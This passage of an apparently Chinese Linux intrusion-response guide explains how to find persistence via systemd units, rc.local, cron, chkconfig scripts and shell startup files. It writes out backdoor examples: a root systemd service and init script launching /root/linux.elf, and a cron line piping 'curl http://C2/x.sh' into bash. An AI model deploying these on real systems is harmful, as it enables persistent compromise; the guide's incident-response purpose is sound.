+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/Pasted%20image%2020241203170333.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/Pasted%20image%2020241203170333.png"  alt="自启动排查" lazyload></a></p>
+<p>2、systemd 服务后门（CentOS7 攻击者常见手法）：自建一个 .service 文件，[Unit] 描述、[Service] 指定 ExecStart 指向后门、[Install] 指定 WantedBy 实现开机启动：</p>
+<figure class="highlight ini"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=attack test</span><br><span class="line"><span class="attr">After</span>=network.target          <span class="comment"># 网络就绪后再启动</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">User</span>=root</span><br><span class="line"><span class="attr">Type</span>=simple                   <span class="comment"># simple=立即启动，oneshot=执行一次退出</span></span><br><span class="line"><span class="attr">ExecStart</span>=/root/linux.elf     <span class="comment"># 后门文件</span></span><br><span class="line"><span class="attr">ExecStop</span>=/bin/kill -s HUP <span class="variable">$MAINPID</span></span><br><span class="line"><span class="attr">ExecReload</span>=/bin/kill -s QUIT <span class="variable">$MAINPID</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target    <span class="comment"># 进入多用户模式（运行级别 3）时启动</span></span><br></pre></td></tr></table></div></figure>
+
+<p>安装与验证：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> attack.service /usr/lib/systemd/system/</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start attack.service</span><br><span class="line">systemctl <span class="built_in">enable</span> attack.service       <span class="comment"># 设为开机自启</span></span><br><span class="line">systemctl is-enabled attack.service   <span class="comment"># enabled=开机自启，static=需手动启动</span></span><br><span class="line"><span class="comment"># enable 失败时手动建软链接：</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/lib/systemd/system/attack.service /usr/lib/systemd/system/multi-user.target.wants/attack.service</span><br><span class="line"><span class="comment"># 自启动管理命令见 4.3</span></span><br></pre></td></tr></table></div></figure>
+
+<p>排查要点：&#x2F;etc&#x2F;systemd&#x2F;system&#x2F; 和 multi-user.target.wants 里出现<mark>陌生 .service</mark>、服务名伪装成系统服务（sshd、sysupdate 之类）、ExecStart <mark>指向 &#x2F;tmp 或用户目录</mark>的，用 <code>systemctl cat 服务名</code> 看内容。</p>
+<p>3、rc.local 后门：CentOS7 的 &#x2F;etc&#x2F;rc.d&#x2F;rc.local 默认权限 644（不可执行），命令写进去不会生效；攻击者要让它跑起来就得 <mark>chmod +x 改成 755</mark>。排查：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ll /etc/rc.d/rc.local          <span class="comment"># 权限变成 755 就要怀疑</span></span><br><span class="line"><span class="built_in">cat</span> /etc/rc.d/rc.local         <span class="comment"># 看有没有指向 /tmp、/root 下 elf/sh 的执行命令</span></span><br></pre></td></tr></table></div></figure>
+<p>rc.local 的发行版差异：</p>
+<ul>
+<li>CentOS7：默认带 &#x2F;etc&#x2F;rc.d&#x2F;rc.local，但权限 644 不可执行，要 chmod +x 才会执行</li>
+<li>Ubuntu：默认不执行 rc.local，需要 systemctl enable rc-local.service 后才会在开机时执行 &#x2F;etc&#x2F;rc.local</li>
+<li>攻击者如果在 Ubuntu 上配 rc.local 后门，一定会同时 enable rc-local.service——两个点都要查</li>
+</ul>
+<h3 id="4-2-计划任务"><a href="#4-2-计划任务" class="headerlink" title="4.2 计划任务"></a>4.2 计划任务</h3><p>定时任务由 cron 守护进程（crond）负责，每分钟扫描一次各计划任务目录，发现到期的任务就执行。排查时重点看两类位置：用户计划任务和系统计划任务。</p>
+<p><strong>用户计划任务（crontab）</strong></p>
+<p>每个用户一个计划任务文件，默认存在 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab -e              <span class="comment"># 编辑当前用户的计划任务</span></span><br><span class="line">crontab -l              <span class="comment"># 列出当前用户的计划任务</span></span><br><span class="line">crontab -r              <span class="comment"># 删除当前用户的所有计划任务（谨慎）</span></span><br><span class="line">crontab -u attack -l    <span class="comment"># 查看指定用户（attack）的计划任务</span></span><br><span class="line">crontab -u attack -e    <span class="comment"># 编辑指定用户的计划任务</span></span><br><span class="line">crontab -u attack -r    <span class="comment"># 删除指定用户的计划任务</span></span><br></pre></td></tr></table></div></figure>
+
+<p>快速查看所有用户的计划任务：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">cut</span> -f 1 -d : | xargs -I &#123;&#125; crontab -l -u &#123;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>系统计划任务（&#x2F;etc 下）</strong></p>
+<ul>
+<li>&#x2F;etc&#x2F;crontab：系统级计划任务文件（需要指定用户名）</li>
+<li>&#x2F;etc&#x2F;cron.d&#x2F;*：碎片化任务文件，格式和 crontab 相同但需要带用户名（如 <code>*/5 * * * * root /tmp/x.sh</code>）</li>
+<li>&#x2F;etc&#x2F;cron.daily&#x2F;、&#x2F;etc&#x2F;cron.hourly&#x2F;、&#x2F;etc&#x2F;cron.weekly&#x2F;、&#x2F;etc&#x2F;cron.monthly&#x2F;：按周期执行的脚本目录</li>
+<li>&#x2F;etc&#x2F;anacrontab：anacron 配置，用于非 7x24 开机机器——机器关机时错过的任务，开机后会补跑（如 <code>@daily 10 example.daily /bin/bash /home/backup.sh</code>）</li>
+</ul>
+<p><strong>时间格式（分 时 日 月 周）</strong></p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># .---------------- minute (0-59)</span><br><span class="line"># |  .------------- hour (0-23)</span><br><span class="line"># |  |  .---------- day of month (1-31)</span><br><span class="line"># |  |  |  .------- month (1-12)</span><br><span class="line"># |  |  |  |  .---- day of week (0-6，周日=0)</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  *  command</span><br></pre></td></tr></table></div></figure>
+
+<p>例如 <code>*/3 * * * * ls &gt;&gt; /tmp/2020test</code> 表示每 3 分钟执行一次。</p>
+<p><strong>入侵排查</strong></p>
+<p>1、检查计划任务目录里有没有恶意脚本：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /var/spool/cron/      <span class="comment"># 用户计划任务</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line">more /etc/cron.d/*</span><br><span class="line">more /etc/cron.daily/*</span><br><span class="line">more /etc/cron.hourly/*</span><br></pre></td></tr></table></div></figure>
+
+<p>2、重点特征：非业务程序、高频执行、<mark>指向 &#x2F;tmp 或用户目录、命令里带 curl&#x2F;wget&#x2F;bash 下载执行</mark>：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * bash /tmp/.x.sh             <span class="comment"># 每分钟执行</span></span><br><span class="line">@reboot bash /tmp/.x.sh                 <span class="comment"># 开机执行</span></span><br><span class="line">*/5 * * * * curl http://C2/x.sh | bash  <span class="comment"># 定时下载执行</span></span><br></pre></td></tr></table></div></figure>
+
+<h3 id="4-3-服务自启动"><a href="#4-3-服务自启动" class="headerlink" title="4.3 服务自启动"></a>4.3 服务自启动</h3><p>服务自启动是”让服务开机自动运行”，同样分两套体系：CentOS6 用 chkconfig 管理 init.d 服务，CentOS7 用 systemctl 管理 systemd 服务。排查前先 <code>cat /etc/redhat-release</code> 分清版本。</p>
+<p><strong>发行版差异（排查前先认清楚）：</strong></p>
+<ul>
+<li>CentOS&#x2F;RHEL 7+ 和 Ubuntu 15.04+ 都已经是 systemd，service&#x2F;systemctl 用法一致，服务文件都在 &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system（系统自带）和 &#x2F;etc&#x2F;systemd&#x2F;system（自定义）</li>
+<li>区别主要在：包管理器（CentOS 用 yum&#x2F;dnf，Ubuntu 用 apt）、服务环境变量文件（CentOS 常见 &#x2F;etc&#x2F;sysconfig&#x2F;xxx，Ubuntu 常见 &#x2F;etc&#x2F;default&#x2F;xxx）、rc.local 行为（见 4.1）</li>
+</ul>
+<p><strong>一、CentOS6：chkconfig 管理 init.d 服务</strong></p>
+<p>原理：服务脚本放在 &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;（&#x2F;etc&#x2F;init.d 是它的软链接），脚本本身没有”开机自启”标记；chkconfig 的作用是在 &#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d&#x2F; 下按运行级别建立 S&#x2F;K 软链接指向 init.d 里的真实脚本——开机进入某个级别时，该级别 rc*.d 目录里的 S 开头脚本就会被启动（软链接机制见 4.1）。</p>
+<p>设置自启动：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add httpd              <span class="comment"># 把 httpd 脚本加入 chkconfig 管理</span></span><br><span class="line">chkconfig --level 2345 httpd on    <span class="comment"># 在 2/3/4/5 级别开机自启</span></span><br><span class="line">chkconfig httpd on                 <span class="comment"># 不加 --level 时默认 2345</span></span><br><span class="line">chkconfig --list                   <span class="comment"># 查看所有服务的自启动状态</span></span><br></pre></td></tr></table></div></figure>
+
+<p>自建脚本做后门（攻击者手法）：写一个带 chkconfig 头注释的启动脚本，chkconfig 就会按注释里指定的级别把它变成开机服务：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/rc.d/init.d/linux_ln.sh</span><br><span class="line">-------------------------------------</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment">#chkconfig:2345 10 90</span></span><br><span class="line"><span class="comment">#decription:backdoor</span></span><br><span class="line">/root/linux.elf</span><br><span class="line">-------------------------------------</span><br><span class="line"><span class="comment"># #chkconfig: 2345=启动级别，10=启动优先级，90=关闭优先级（1~100 越小越优）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x /etc/rc.d/init.d/linux_ln.sh   <span class="comment"># 脚本要有可执行权限</span></span><br><span class="line">chkconfig --add linux_ln.sh</span><br><span class="line">chkconfig --level 2 linux_ln.sh on</span><br><span class="line">chkconfig --list</span><br><span class="line">linux_ln.sh     0:关    1:关    2:开    3:开    4:开    5:开    6:关</span><br><span class="line"></span><br><span class="line">ll /etc/rc.d/rc3.d/</span><br><span class="line">lrwxrwxrwx. 1 root root 21 7月  27 11:27 S10linux_ln.sh -&gt; ../init.d/linux_ln.sh</span><br><span class="line"><span class="comment"># chkconfig --level 2 on 之后，rc3.d 里出现了 S10linux_ln.sh 软链接</span></span><br></pre></td></tr></table></div></figure>
+
+<p>排查：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list | grep <span class="string">&quot;3:on\|5:on&quot;</span>      <span class="comment"># 英文环境：3/5 级别开启的服务</span></span><br><span class="line">chkconfig --list | grep <span class="string">&quot;3:启用\|5:启用&quot;</span>   <span class="comment"># 中文环境</span></span><br><span class="line"><span class="built_in">ls</span> -l /etc/rc.d/rc3.d/                    <span class="comment"># 直接看 3 级别下的 S/K 软链接</span></span><br><span class="line">ps aux | grep crond                       <span class="comment"># 确认服务进程是否在跑</span></span><br></pre></td></tr></table></div></figure>
+
+<p>重点：chkconfig –list 里多出来的<mark>陌生服务名</mark>、&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F; 下<mark>权限异常（rwxrwxrwx）的新 .sh</mark>、rc[0~6].d 下<mark>对不上号的 S&#x2F;K 软链接</mark>，都要查。</p>
+<p><strong>二、CentOS7：systemctl 管理 systemd 服务</strong></p>
+<p>原理：服务单元文件（.service）放在 &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;（系统自带）或 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;（管理员自定义、优先级更高）。systemctl enable 做的也是建软链接——在 multi-user.target.wants 等目录下生成指向单元文件的软链接，开机进入对应 target 时服务自动启动。</p>
+<p>设置自启动：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> httpd        <span class="comment"># 开机自启（在 .wants 目录建软链接）</span></span><br><span class="line">systemctl <span class="built_in">disable</span> httpd       <span class="comment"># 取消自启（删软链接）</span></span><br><span class="line">systemctl start httpd         <span class="comment"># 立即启动（不设自启）</span></span><br><span class="line">systemctl status httpd        <span class="comment"># 查看状态（含进程 PID、启动时间）</span></span><br><span class="line">systemctl is-enabled httpd    <span class="comment"># enabled=开机自启，disabled=不自启</span></span><br><span class="line">systemctl list-unit-files --<span class="built_in">type</span>=service | grep enabled   <span class="comment"># 所有开机自启的服务</span></span><br></pre></td></tr></table></div></figure>
+
+<p>排查：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files --<span class="built_in">type</span>=service | grep enabled   <span class="comment"># 自启服务全量</span></span><br><span class="line">systemctl list-units --<span class="built_in">type</span>=service --state=running       <span class="comment"># 正在运行的服务</span></span><br><span class="line">systemctl status 服务名                                    <span class="comment"># 单个服务状态</span></span><br><span class="line">systemctl <span class="built_in">cat</span> 服务名                                       <span class="comment"># 看单元文件内容（ExecStart 指向）</span></span><br><span class="line"><span class="built_in">ls</span> -l /etc/systemd/system/multi-user.target.wants/        <span class="comment"># 自启软链接目录</span></span><br></pre></td></tr></table></div></figure>
+
+<p>重点：把”开机自启服务列表”和”业务实际需要的服务”对比，多出来的、名字<mark>伪装成系统服务</mark>（sshd、kworker、sysupdate 之类）的，用 systemctl cat 看单元文件，<mark>确认 ExecStart 指向是否正常</mark>（后门服务的 .service 文件示例见 4.1）。</p>
+<p><strong>认识一个真实的 .service 文件（Ubuntu 的 ssh.service）：</strong></p>
+<figure class="highlight ini"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=OpenBSD Secure Shell server</span><br><span class="line"><span class="attr">Documentation</span>=man:sshd(<span class="number">8</span>) man:sshd_config(<span class="number">5</span>)</span><br><span class="line"><span class="attr">After</span>=network.target auditd.service</span><br><span class="line"><span class="attr">ConditionPathExists</span>=!/etc/ssh/sshd_not_to_be_run</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">EnvironmentFile</span>=-/etc/default/ssh</span><br><span class="line"><span class="attr">ExecStartPre</span>=/usr/sbin/sshd -t</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/sbin/sshd -D <span class="variable">$SSHD_OPTS</span></span><br><span class="line"><span class="attr">ExecReload</span>=/usr/sbin/sshd -t</span><br><span class="line"><span class="attr">ExecReload</span>=/bin/kill -HUP <span class="variable">$MAINPID</span></span><br><span class="line"><span class="attr">KillMode</span>=process</span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">on</span>-failure</span><br><span class="line"><span class="attr">RestartPreventExitStatus</span>=<span class="number">255</span></span><br><span class="line"><span class="attr">Type</span>=notify</span><br><span class="line"><span class="attr">RuntimeDirectory</span>=sshd</span><br><span class="line"><span class="attr">RuntimeDirectoryMode</span>=<span class="number">0755</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br><span class="line"><span class="attr">Alias</span>=sshd.service</span><br></pre></td></tr></table></div></figure>
+
+<p>字段含义：</p>
+<p>[Unit] 段——描述服务和依赖关系：</p>
+<ul>
+<li>Description &#x2F; Documentation：服务描述和文档位置</li>
+<li>After&#x3D;network.target auditd.service：等网络和 auditd 就绪后再启动</li>
+<li>ConditionPathExists&#x3D;!路径：路径不存在（! 取反）才启动，条件不满足就跳过</li>
+</ul>
+<p>[Service] 段——定义怎么运行：</p>
+<ul>
+<li>EnvironmentFile&#x3D;-&#x2F;etc&#x2F;default&#x2F;ssh：启动前加载环境变量文件，- 表示文件不存在也不报错</li>
+<li>ExecStartPre&#x3D;&#x2F;usr&#x2F;sbin&#x2F;sshd -t：真正启动前先做配置语法检查</li>
+<li>ExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;sshd -D $SSHD_OPTS：启动命令（-D 前台运行，把进程交给 systemd 托管）</li>
+<li>ExecReload：reload 时执行（先重新检查配置，再发 HUP 信号）</li>
+<li>KillMode&#x3D;process：停止时只杀主进程</li>
+<li>Restart&#x3D;on-failure：异常退出自动重启</li>
+<li>RestartPreventExitStatus&#x3D;255：退出码 255 不自动重启</li>
+<li>Type&#x3D;notify：服务启动完成后主动通知 systemd</li>
+<li>RuntimeDirectory&#x3D;sshd：自动创建 &#x2F;run&#x2F;sshd 运行目录</li>
+</ul>
+<p>[Install] 段——决定能否开机自启（systemctl enable 用的就是这段）：</p>
+<ul>
+<li>WantedBy&#x3D;multi-user.target：开机进入多用户模式（运行级别 3）时启动</li>
+<li>Alias&#x3D;sshd.service：给服务起别名，enable 时同时建别名软链接（所以 systemctl start ssh 也能用）</li>
+</ul>
+<p><strong>有 [Install] 和没有 [Install] 的区别：</strong></p>
+<ul>
+<li>有 [Install]：可以用 systemctl enable 设置开机自启。enable 的实质就是在 WantedBy 对应目录（如 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;）建软链接，开机进 target 时自动启动；带 Alias 的话同时建别名软链接</li>
+<li>没有 [Install]：systemctl enable 会报错（单元文件没有安装配置），这类服务只能手动 start&#x2F;stop，不能开机自启，除非被其他服务或 target 直接引用</li>
+</ul>
+<p><strong>start 和 enable 的区别（最容易混）：</strong></p>
+<ul>
+<li>systemctl start &#x3D; 立即启动，重启后失效</li>
+<li>systemctl enable &#x3D; 设置开机自启（建软链接），不会立刻启动服务；想让本次会话也跑起来，两个都要执行</li>
+</ul>
+<p><strong>三、rc.local 方式</strong>：CentOS7 的 &#x2F;etc&#x2F;rc.d&#x2F;rc.local 默认不可执行（644），攻击者改成 755 并写入启动命令即可开机执行，排查方法见 4.1。</p>
+<p><strong>一句话速查（30 秒过完这个点）：</strong></p>
+<ul>
+<li>CentOS6：<code>chkconfig --list</code> + <code>ls -l /etc/rc.d/rc3.d/</code>——查陌生服务名和 S&#x2F;K 软链接</li>
+<li>CentOS7：<code>systemctl list-unit-files --type=service | grep enabled</code> + <code>ls /etc/systemd/system/multi-user.target.wants/</code>——查自定义服务和软链接</li>
+<li>Ubuntu：同样看 systemctl，额外查 <code>systemctl status rc-local.service</code> 是否被 enable</li>
+<li>所有发行版：&#x2F;etc&#x2F;systemd&#x2F;system 下的自定义 .service 一律 <code>systemctl cat</code> 看 ExecStart</li>
+</ul>
+<h3 id="4-4-Shell-启动文件与命令别名后门"><a href="#4-4-Shell-启动文件与命令别名后门" class="headerlink" title="4.4 Shell 启动文件与命令别名后门"></a>4.4 Shell 启动文件与命令别名后门</h3><p>攻击者常往登录 shell 启动文件里塞命令，<mark>任何用户登录就执行</mark>：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/profile /etc/bash.bashrc</span><br><span class="line"><span class="built_in">cat</span> /etc/profile.d/*.sh</span><br><span class="line"><span class="built_in">cat</span> /root/.bashrc /root/.bash_profile</span><br><span class="line"><span class="built_in">cat</span> /home/*/.bashrc /home/*/.bash_profile</span><br><span class="line"><span class="built_in">alias</span>                    <span class="comment"># 查命令别名是否被篡改（如 alias ls=...）</span></span><br><span class="line"><span class="built_in">stat</span> /etc/profile /root/.bashrc /etc/profile.d/*.sh   <span class="comment"># mtime 与事发时间比对</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>rc.local 后门：</strong> CentOS7 的 &#x2F;etc&#x2F;rc.d&#x2F;rc.local 默认权限 644（不可执行），命令写进去不会生效；攻击者要让它跑起来就得 <mark>chmod +x 改成 755</mark>，并在文件里写入启动命令。</p>
+<p>排查思路：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ll /etc/rc.d/rc.local          <span class="comment"># 权限变成 755 就要怀疑</span></span><br><span class="line"><span class="built_in">cat</span> /etc/rc.d/rc.local         <span class="comment"># 看有没有指向 /tmp、/root 下 elf/sh 的执行命令</span></span><br></pre></td></tr></table></div></figure>
+<p>rc.local 的发行版差异：</p>
+<ul>
+<li>CentOS7：默认带 &#x2F;etc&#x2F;rc.d&#x2F;rc.local，但权限 644 不可执行，要 chmod +x 才会执行</li>
+<li>Ubuntu：默认不执行 rc.local，需要 systemctl enable rc-local.service 后才会在开机时执行 &#x2F;etc&#x2F;rc.local</li>
+<li>攻击者如果在 Ubuntu 上配 rc.local 后门，一定会同时 enable rc-local.service——两个点都要查</li>
+</ul>
+<p>systemd 补充：</p>
+<ul>
+<li>multi-user.target 对应运行级别 3，<code>systemctl isolate multi-user.target</code> 可切换；.service 里 WantedBy&#x3D;multi-user.target 表示进入多用户模式时开机启动</li>
+<li>常见字段：After&#x3D;network.target（网络就绪后再启动）、Type&#x3D;simple（立即启动）&#x2F;oneshot（执行一次退出）、ExecStart&#x2F;ExecStop&#x2F;ExecReload（启动&#x2F;停止&#x2F;重载命令）</li>
+<li>&#x2F;etc&#x2F;systemd&#x2F;system&#x2F; 的优先级高于 &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;，攻击者也会直接改既有服务文件（比如在 sshd.service 的 ExecStart 前加 payload）</li>
+</ul>
+<h2 id="五、文件与命令完整性"><a href="#五、文件与命令完整性" class="headerlink" title="五、文件与命令完整性"></a>五、文件与命令完整性</h2><h3 id="5-1-可疑文件排查"><a href="#5-1-可疑文件排查" class="headerlink" title="5.1 可疑文件排查"></a>5.1 可疑文件排查</h3><p><strong>1、敏感目录排查</strong></p>
+<p>攻击者常把落地文件放在 &#x2F;tmp、&#x2F;dev&#x2F;shm、&#x2F;var&#x2F;tmp（可写、可执行），重点看这些目录和隐藏文件：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp /dev/shm /var/tmp             <span class="comment"># 隐藏文件也要看（. 开头）</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;.*&quot;</span> 2&gt;/dev/null     <span class="comment"># 全盘找隐藏文件</span></span><br><span class="line">mount | grep -E <span class="string">&quot;/tmp|/dev/shm&quot;</span>           <span class="comment"># 检查挂载是否带 noexec</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>2、按时间找可疑文件</strong></p>
+<p>发现木马&#x2F;WebShell 后，按创建或修改时间找同一时间窗内的文件：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">find /opt -iname <span class="string">&quot;*&quot;</span> -atime 1 -<span class="built_in">type</span> f     <span class="comment"># 一天内访问过的文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;*.sh&quot;</span> 2&gt;/dev/null   <span class="comment"># 特定类型文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -mtime -1 2&gt;/dev/null      <span class="comment"># 24 小时内修改的文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -size +100M 2&gt;/dev/null    <span class="comment"># 大文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 排除 /proc /sys /dev 等动态目录，避免干扰：</span></span><br><span class="line">find / -<span class="built_in">type</span> f -mtime -1 ! -path <span class="string">&quot;/proc/*&quot;</span> ! -path <span class="string">&quot;/sys/*&quot;</span> ! -path <span class="string">&quot;/dev/*&quot;</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知攻击时间范围，用精确时间窗过滤：</span></span><br><span class="line">find / -newerct <span class="string">&quot;2024-10-16 22:50:00&quot;</span> ! -newerct <span class="string">&quot;2024-10-17 00:20:00&quot;</span> ! -path <span class="string">&quot;/proc/*&quot;</span> ! -path <span class="string">&quot;/sys/*&quot;</span> ! -path <span class="string">&quot;/run/*&quot;</span></span><br><span class="line"><span class="comment"># -newerct 按创建时间过滤；! -newerct 排除晚于该时间；! -path 排除动态目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更简单的写法：确定攻击时间后，按修改时间找时间窗内的文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -newermt <span class="string">&quot;2025-01-01 16:00&quot;</span> -a -not -newermt <span class="string">&quot;2025-01-01 16:05&quot;</span> 2&gt;/dev/null</span><br><span class="line"><span class="comment"># -newermt 按修改时间（mtime）；-newerat 按访问时间；-newerct 按状态/创建时间，三个参数可互换</span></span><br><span class="line"><span class="comment"># -a -not 组合：晚于 16:00 且不晚于 16:05，即 16:00~16:05 之间修改的文件</span></span><br></pre></td></tr></table></div></figure>
+
+<p>时间线思路：把登录记录（last）、进程启动时间（lstart）、文件 mtime、服务安装时间（rpm -qa –last）排成一条线，能快速定位攻击入口和扩散路径。</p>
+<h3 id="5-2-命令替换与文件保护"><a href="#5-2-命令替换与文件保护" class="headerlink" title="5.2 命令替换与文件保护"></a>5.2 命令替换与文件保护</h3><p>用 stat&#x2F;ls 看命令文件的修改时间，再和同版本干净系统做 md5 对比：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span> /bin/ps                <span class="comment"># atime/mtime/ctime 三个时间</span></span><br><span class="line"><span class="built_in">ls</span> -l /bin/ps               <span class="comment"># mtime（内容最后修改时间）</span></span><br><span class="line">find /bin/ /sbin/ -mtime 0  <span class="comment"># 一天内被修改的命令文件</span></span><br><span class="line"><span class="built_in">md5sum</span> /bin/ps              <span class="comment"># 与干净系统对比，不一致说明被替换</span></span><br><span class="line"><span class="built_in">hash</span> -l                     <span class="comment"># bash 命令哈希表，看命令名是否被绑定到恶意路径</span></span><br><span class="line">rpm -qa --last | <span class="built_in">head</span> -20  <span class="comment"># 最近安装的包（挖矿组件/提权工具常在这露头）</span></span><br></pre></td></tr></table></div></figure>
+
